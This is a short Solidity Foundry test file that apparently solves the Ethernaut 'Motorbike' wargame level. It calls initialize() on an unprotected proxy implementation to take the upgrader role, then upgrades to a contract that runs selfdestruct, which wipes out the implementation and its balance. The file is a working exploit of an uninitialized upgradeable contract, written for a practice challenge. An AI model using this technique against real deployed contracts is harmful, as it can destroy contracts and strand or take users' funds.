// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/Initializable.sol";
import "src/Contract.sol";
import "forge-std/Test.sol";

interface IEngine {
    function upgrader() external returns (address);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

interface IMotorbike {

}

contract SuicideContract {
    function commitSuicide() public {
        selfdestruct(payable(address(0)));
    }
}

contract ExploitTest is Test {

    Motorbike motorbike;
    Engine engine;
    IMotorbike motorbikeIface;
    IEngine engineIface;

    function setUp() public {
        engine = new Engine();
        motorbike = new Motorbike(address(engine));
        motorbikeIface = IMotorbike(address(motorbike));
        engineIface = IEngine(address(engine));
    }

    function testExploit() public {
        SuicideContract s = new SuicideContract();
        vm.deal(address(engineIface), 100 ether);
        assertEq(address(engineIface).balance, 100 ether);
        engineIface.initialize();
        engineIface.upgradeToAndCall(address(s), abi.encodeWithSignature("commitSuicide()"));
        assertEq(address(engineIface).balance, 0);
    }   
}